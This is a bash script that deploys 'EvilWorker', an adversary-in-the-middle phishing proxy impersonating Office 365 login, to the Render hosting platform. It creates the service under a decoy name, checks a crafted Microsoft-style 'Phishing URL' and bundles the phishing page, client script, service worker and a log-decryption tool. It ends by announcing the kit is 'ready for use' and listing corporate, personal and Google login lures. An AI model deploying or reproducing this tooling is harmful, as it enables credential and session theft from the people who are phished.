#!/bin/bash

# EvilWorker Automated Deployment Script
# This script automatically deploys the working EvilWorker proxy to Render
# Author: EvilWorker Team
# Version: 1.0

set -e  # Exit on any error

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
SERVICE_NAME="office365-auth-portal"
REPO_URL="https://github.com/Billoxinogen18/office365-auth-portal.git"
DOMAIN_NAME="aitm-test.onrender.com"

# Function to print colored output
print_status() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Function to check if command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Function to install dependencies
install_dependencies() {
    print_status "Checking and installing dependencies..."
    
    # Check for Node.js
    if ! command_exists node; then
        print_warning "Node.js not found. Installing Node.js..."
        if [[ "$OSTYPE" == "darwin"* ]]; then
            # macOS
            if command_exists brew; then
                brew install node
            else
                print_error "Please install Homebrew first: https://brew.sh/"
                exit 1
            fi
        elif [[ "$OSTYPE" == "linux-gnu"* ]]; then
            # Linux
            curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
            sudo apt-get install -y nodejs
        else
            print_error "Unsupported OS. Please install Node.js manually."
            exit 1
        fi
    else
        print_success "Node.js is already installed: $(node --version)"
    fi
    
    # Check for npm
    if ! command_exists npm; then
        print_error "npm not found. Please install Node.js with npm."
        exit 1
    fi
    
    # Check for git
    if ! command_exists git; then
        print_error "git not found. Please install git first."
        exit 1
    fi
    
    # Check for curl
    if ! command_exists curl; then
        print_error "curl not found. Please install curl first."
        exit 1
    fi
    
    print_success "All dependencies are available!"
}

# Function to get Render API key
get_render_api_key() {
    if [ -z "$RENDER_API_KEY" ]; then
        print_status "Render API key not found in environment variables."
        echo -n "Please enter your Render API key: "
        read -s RENDER_API_KEY
        echo
        if [ -z "$RENDER_API_KEY" ]; then
            print_error "API key is required!"
            exit 1
        fi
    else
        print_success "Using Render API key from environment variables."
    fi
}

# Function to check if service exists
check_service_exists() {
    print_status "Checking if service exists on Render..."
    
    local response=$(curl -s -H "Authorization: Bearer $RENDER_API_KEY" \
        "https://api.render.com/v1/services" | \
        jq -r ".[] | select(.name == \"$SERVICE_NAME\") | .id" 2>/dev/null || echo "")
    
    if [ -n "$response" ]; then
        print_success "Service found: $response"
        echo "$response"
    else
        print_warning "Service not found. Will create new service."
        echo ""
    fi
}

# Function to create service
create_service() {
    print_status "Creating new service on Render..."
    
    local service_data=$(cat <<EOF
{
    "type": "web_service",
    "name": "$SERVICE_NAME",
    "repo": "$REPO_URL",
    "branch": "main",
    "buildCommand": "npm install",
    "startCommand": "node proxy_server.js",
    "plan": "free",
    "region": "oregon",
    "healthCheckPath": "/health",
    "envVars": [
        {
            "key": "NODE_ENV",
            "value": "production"
        }
    ]
}
EOF
)
    
    local response=$(curl -s -X POST \
        -H "Authorization: Bearer $RENDER_API_KEY" \
        -H "Content-Type: application/json" \
        -d "$service_data" \
        "https://api.render.com/v1/services")
    
    local service_id=$(echo "$response" | jq -r '.id' 2>/dev/null)
    
    if [ "$service_id" != "null" ] && [ -n "$service_id" ]; then
        print_success "Service created successfully: $service_id"
        echo "$service_id"
    else
        print_error "Failed to create service. Response: $response"
        exit 1
    fi
}

# Function to trigger deployment
trigger_deployment() {
    local service_id="$1"
    
    print_status "Triggering deployment for service: $service_id"
    
    local response=$(curl -s -X POST \
        -H "Authorization: Bearer $RENDER_API_KEY" \
        "https://api.render.com/v1/services/$service_id/deploys")
    
    local deploy_id=$(echo "$response" | jq -r '.id' 2>/dev/null)
    
    if [ "$deploy_id" != "null" ] && [ -n "$deploy_id" ]; then
        print_success "Deployment triggered: $deploy_id"
        echo "$deploy_id"
    else
        print_error "Failed to trigger deployment. Response: $response"
        exit 1
    fi
}

# Function to monitor deployment
monitor_deployment() {
    local service_id="$1"
    local deploy_id="$2"
    
    print_status "Monitoring deployment progress..."
    
    local max_attempts=30
    local attempt=0
    
    while [ $attempt -lt $max_attempts ]; do
        local response=$(curl -s -H "Authorization: Bearer $RENDER_API_KEY" \
            "https://api.render.com/v1/services/$service_id/deploys/$deploy_id")
        
        local status=$(echo "$response" | jq -r '.status' 2>/dev/null)
        
        case "$status" in
            "live")
                print_success "Deployment completed successfully!"
                return 0
                ;;
            "build_failed"|"update_failed")
                print_error "Deployment failed!"
                echo "$response" | jq -r '.message' 2>/dev/null
                exit 1
                ;;
            "building"|"updating")
                print_status "Deployment in progress... (attempt $((attempt + 1))/$max_attempts)"
                ;;
            *)
                print_warning "Unknown status: $status"
                ;;
        esac
        
        sleep 10
        attempt=$((attempt + 1))
    done
    
    print_warning "Deployment monitoring timed out. Check Render dashboard for status."
}

# Function to get service URL
get_service_url() {
    local service_id="$1"
    
    print_status "Getting service URL..."
    
    local response=$(curl -s -H "Authorization: Bearer $RENDER_API_KEY" \
        "https://api.render.com/v1/services/$service_id")
    
    local service_url=$(echo "$response" | jq -r '.serviceDetails.url' 2>/dev/null)
    
    if [ "$service_url" != "null" ] && [ -n "$service_url" ]; then
        print_success "Service URL: $service_url"
        echo "$service_url"
    else
        print_warning "Could not get service URL. Check Render dashboard."
        echo ""
    fi
}

# Function to test deployment
test_deployment() {
    local service_url="$1"
    
    if [ -z "$service_url" ]; then
        print_warning "No service URL available for testing."
        return
    fi
    
    print_status "Testing deployment..."
    
    # Test health endpoint
    local health_response=$(curl -s -o /dev/null -w "%{http_code}" "$service_url/health")
    if [ "$health_response" = "200" ]; then
        print_success "Health endpoint working: $service_url/health"
    else
        print_warning "Health endpoint returned: $health_response"
    fi
    
    # Test main endpoint
    local main_response=$(curl -s -o /dev/null -w "%{http_code}" "$service_url/")
    if [ "$main_response" = "404" ]; then
        print_success "Main endpoint working (404 expected): $service_url/"
    else
        print_warning "Main endpoint returned: $main_response"
    fi
    
    # Test phishing URL
    local phishing_url="$service_url/login?method=signin&mode=secure&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F"
    local phishing_response=$(curl -s -o /dev/null -w "%{http_code}" "$phishing_url")
    if [ "$phishing_response" = "200" ]; then
        print_success "Phishing URL working: $phishing_url"
    else
        print_warning "Phishing URL returned: $phishing_response"
    fi
}

# Function to create deployment package
create_deployment_package() {
    print_status "Creating deployment package with working files..."
    
    # Create temporary directory
    local temp_dir=$(mktemp -d)
    local package_dir="$temp_dir/evilworker-deployment"
    
    mkdir -p "$package_dir"
    
    # Copy only the essential working files
    cp proxy_server.js "$package_dir/"
    cp package.json "$package_dir/"
    cp render.yaml "$package_dir/"
    cp index_smQGUDpTF7PN.html "$package_dir/"
    cp 404_not_found_lk48ZVr32WvU.html "$package_dir/"
    cp script_Vx9Z6XN5uC3k.js "$package_dir/"
    cp service_worker_Mz8XO2ny1Pg5.js "$package_dir/"
    cp decrypt_log_file.js "$package_dir/"
    
    # Create README for deployment
    cat > "$package_dir/README.md" <<EOF
# EvilWorker Deployment Package

This package contains only the essential files needed for EvilWorker deployment.

## Files Included:
- proxy_server.js - Main proxy server (working Azure version)
- package.json - Node.js dependencies
- render.yaml - Render deployment configuration
- index_smQGUDpTF7PN.html - Phishing page template
- 404_not_found_lk48ZVr32WvU.html - 404 error page
- script_Vx9Z6XN5uC3k.js - Client-side phishing script
- service_worker_Mz8XO2ny1Pg5.js - Service worker for phishing
- decrypt_log_file.js - Log decryption utility

## Deployment:
1. Upload to your repository
2. Connect to Render
3. Deploy using the provided configuration

## Domain Configuration:
- Service Name: $SERVICE_NAME
- Expected Domain: $DOMAIN_NAME
- Health Check: /health
- Phishing URL: /login?method=signin&mode=secure&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F
EOF
    
    # Create zip package
    local zip_file="evilworker-deployment-$(date +%Y%m%d-%H%M%S).zip"
    cd "$temp_dir"
    zip -r "$zip_file" evilworker-deployment/
    
    # Move to current directory
    mv "$zip_file" "$(pwd)/"
    
    # Cleanup
    rm -rf "$temp_dir"
    
    print_success "Deployment package created: $zip_file"
    echo "$zip_file"
}

# Main deployment function
main() {
    echo "🚀 EvilWorker Automated Deployment Script"
    echo "=========================================="
    echo
    
    # Check dependencies
    install_dependencies
    
    # Get API key
    get_render_api_key
    
    # Check if jq is available
    if ! command_exists jq; then
        print_warning "jq not found. Installing jq..."
        if [[ "$OSTYPE" == "darwin"* ]]; then
            if command_exists brew; then
                brew install jq
            else
                print_error "Please install jq manually: https://stedolan.github.io/jq/"
                exit 1
            fi
        elif [[ "$OSTYPE" == "linux-gnu"* ]]; then
            sudo apt-get update && sudo apt-get install -y jq
        else
            print_error "Please install jq manually: https://stedolan.github.io/jq/"
            exit 1
        fi
    fi
    
    # Check if service exists
    local service_id=$(check_service_exists)
    
    if [ -z "$service_id" ]; then
        # Create new service
        service_id=$(create_service)
    fi
    
    # Trigger deployment
    local deploy_id=$(trigger_deployment "$service_id")
    
    # Monitor deployment
    monitor_deployment "$service_id" "$deploy_id"
    
    # Get service URL
    local service_url=$(get_service_url "$service_id")
    
    # Test deployment
    test_deployment "$service_url"
    
    # Create deployment package
    local package_file=$(create_deployment_package)
    
    echo
    echo "🎉 Deployment Complete!"
    echo "======================="
    echo "Service ID: $service_id"
    echo "Deploy ID: $deploy_id"
    echo "Service URL: $service_url"
    echo "Package File: $package_file"
    echo
    echo "🔗 Test URLs:"
    echo "Health Check: $service_url/health"
    echo "Corporate Login: $service_url/c"
    echo "Personal Login: $service_url/p"
    echo "Google Login: $service_url/g"
    echo "Phishing URL: $service_url/login?method=signin&mode=secure&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F"
    echo
    print_success "EvilWorker is now deployed and ready for use!"
}

# Run main function
main "$@"
